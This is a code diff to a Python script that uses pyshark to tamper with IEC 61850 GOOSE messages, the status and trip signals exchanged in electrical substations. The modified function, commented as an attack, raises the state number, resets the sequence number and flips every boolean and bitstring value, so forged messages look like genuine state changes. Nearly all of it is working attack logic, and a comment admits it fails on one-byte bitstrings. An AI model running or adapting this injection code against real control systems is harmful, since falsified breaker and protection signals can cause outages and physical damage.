@@ -13,8 +13,20 @@ import pyshark
 
 def yourcode(inpacket):  
     #sqnum attack
-    print("Original sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])
-    c=int(inpacket.goose.goosePdu_element.sqNum_raw[0],16)+1 ##convert to int to increment
+    #print("Original stNum " + inpacket.goose.goosePdu_element.stNum_raw[0])
+    c=int(inpacket.goose.goosePdu_element.stNum_raw[0],16)+1 ##convert to int to increment
+    c=format(c,'x') #format back to hex
+
+    d=""
+    for i in range(0,len(inpacket.goose.goosePdu_element.stNum_raw[0])-len(str(c))):
+        d+="0" ##this padds with zeros based on length
+    d+=str(c) #finishes off the string
+
+
+    inpacket.goose.goosePdu_element.stNum_raw[0]=LFC(d)
+    #print("New stNum " + inpacket.goose.goosePdu_element.stNum_raw[0])
+
+    c=int(0) ##convert to int to increment
     c=format(c,'x') #format back to hex
 
     d=""
@@ -24,20 +36,36 @@ def yourcode(inpacket):
 
 
     inpacket.goose.goosePdu_element.sqNum_raw[0]=LFC(d)
-    print("New sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])
+    #print("New sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])
 
-    #change some data
+    #print(inpacket.goose)
+    counter=0
+    for element in inpacket.goose.goosePdu_element.allData_tree.Data:
+        if (element=='3'):
+            #boolean only
+            #print("Found 0x83 (bool)")
+           # print("Flipping all bits")
+            if(inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=='00'):
+                  inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=LFC('11')  
+            else:
+                inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=LFC('00')
 
-    #print(inpacket.goose.goosePdu_element.allData_tree.Data_raw)
-    for element in inpacket.goose.goosePdu_element.allData_tree.Data_raw:
-        if (element[2]=='2'):
-            print("Found data of length 2")
+        elif (element=='4'):
+            #print("Found 0x84 (bitstring)")
+            #print("flipping all bits")
+            #doesnt work for short 1 byte bit strings
+            data=int(inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].bit_string_raw[0].raw_value,16)^0xffff
+            padding=int(inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].padding_raw[0].raw_value)
+            for i in range(0,padding):
+                data=data^(pow(2,i))
+            data=format(data,'x')
+            data=inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].padding_raw[0].raw_value+data
+            #print(inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0])
             
-            pad=str(element[0][0])+'4'
-            pad+='10'
+            inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=LFC(data)  
+        
+        counter+=1
 
-            element[0]=LFC(pad)
-            print("Data changed to " +pad)
 
             
     return 
